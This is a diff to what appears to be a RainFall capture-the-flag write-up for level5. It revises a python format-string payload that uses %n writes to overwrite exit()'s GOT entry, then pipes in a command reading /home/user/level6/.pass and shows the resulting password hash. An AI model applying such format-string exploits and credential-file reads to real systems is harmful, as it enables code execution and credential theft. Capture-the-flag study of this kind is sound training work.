@@ -53,10 +53,7 @@ exit() = 0x08049838
 2 0x04   4 > 4+4+4+4+148+224+x     = 516 (0x204) x=128
 1 0x08   8 > 4+4+4+4+148+224+128+x = 520 (0x208) x=4
 ```shell
-level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "\x39\x98\x04\x08" + "\x3a\x98\x04\x08" + "\x3b\x98\x04\x08" + "%1$148x%4$n"+ "%1$224x%5$n" + "%1$128x%6$n" + "%1$4x%7$n"'; cat -) | ./level5
-89:;                                                                                                                                                 200                                                                                                                                                                                                                             200                                                                                                                             200 200
-whoami
-level6
-cat /home/user/level6/.pass
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "\x39\x98\x04\x08" + "\x3a\x98\x04\x08" + "\x3b\x98\x04\x08" + "%148hhx%4$n"+ "%224hhx%5$n" + "%128hhx%6$n" + "%4hhx%7$n"'; echo "cat /home/user/level6/.pass") | ./level5
+89:;                                                                                                                                                   0                                                                                                                                                                                                                              c0                                                                                                                              d0  38
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
